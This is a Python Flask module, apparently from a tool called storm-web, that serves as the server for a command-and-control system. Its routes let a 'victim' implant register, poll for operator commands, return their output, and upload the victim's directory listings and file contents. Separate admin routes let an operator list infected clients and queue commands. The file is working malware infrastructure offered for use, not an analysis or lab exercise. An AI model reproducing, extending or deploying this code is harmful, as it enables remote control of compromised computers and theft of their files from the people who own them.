"""P3.2 part C - /api/c2/* (C2 implant + admin file manager).

Routes verbatim from storm-web/app.py:601-779 (moved at P3.3).  Since
P4.2 this blueprint is a thin HTTP adapter: request parsing, validation
and ``jsonify`` stay here; all C2 business logic lives in
``app/services/c2.py`` (state via ``app.state.STORE``, persistence via
``database.py``).  Response shapes are frozen and enforced by
tests/char.
"""
from __future__ import annotations

import os

from flask import Blueprint, jsonify, request

from app.state import BASE_DIR
from app.services import c2 as c2svc


bp = Blueprint("capture_c2", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


# ---------------------------------------------------------------------------
# Victim-side: implant polls / queues commands / returns responses.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/register', methods=['POST'])
def c2_register():
    data = request.json
    uid = data.get('uid')
    info = data.get('info', {})

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    c2svc.register_client(uid, info, request.remote_addr)

    return jsonify({'status': 'registered'})


@bp.route('/api/c2/poll', methods=['POST'])
def c2_poll():
    data = request.json
    uid = data.get('uid')

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    cmd = c2svc.poll(uid)
    if cmd is not None:
        return jsonify({'command': cmd})

    return jsonify({'command': None})


@bp.route('/api/c2/response', methods=['POST'])
def c2_response():
    data = request.json
    uid = data.get('uid')
    output = data.get('output')

    if not uid:
        return jsonify({'error': 'No uid provided'}), 400

    c2svc.post_response(uid, output)

    return jsonify({'status': 'received'})


# ---------------------------------------------------------------------------
# Admin APIs: list clients, queue commands, stream responses.
# ---------------------------------------------------------------------------
@bp.route('/api/c2/clients')
def c2_list_clients():
    return jsonify({'clients': c2svc.list_clients()})


@bp.route('/api/c2/queue_command', methods=['POST'])
def c2_queue_command():
    data = request.json
    uid = data.get('uid')
    cmd = data.get('cmd')

    c2svc.queue_command(uid, cmd)
    return jsonify({'status': 'queued'})


@bp.route('/api/c2/get_responses/<uid>')
def c2_get_responses(uid):
    # stream semantics: drain returns everything and empties the queue
    return jsonify({'responses': c2svc.drain_responses(uid)})


# ---------------------------------------------------------------------------
# File-manager endpoints (between victim implant and operator panel).
# ---------------------------------------------------------------------------
@bp.route('/api/c2/get_file_list/<uid>')
def c2_get_file_list(uid):
    file_data = c2svc.take_file_list(uid)
    if file_data is not None:
        return jsonify(file_data)
    return jsonify({'files': None})


@bp.route('/api/c2/get_download/<uid>')
def c2_get_download(uid):
    file_data = c2svc.take_download(uid)
    if file_data is not None:
        return jsonify(file_data)
    return jsonify({'file': None})


@bp.route('/api/c2/file_list_response', methods=['POST'])
def c2_file_list_response():
    """Victim sends file list back."""
    data = request.json
    uid = data.get('uid')
    files = data.get('files')
    path = data.get('path')

    if uid:
        c2svc.store_file_list(uid, files, path)

    return jsonify({'status': 'received'})


@bp.route('/api/c2/file_download_response', methods=['POST'])
def c2_file_download_response():
    """Victim sends file content back."""
    data = request.json
    uid = data.get('uid')
    content = data.get('content')
    filename = data.get('filename')

    if uid:
        c2svc.store_download(uid, content, filename)

    return jsonify({'status': 'received'})
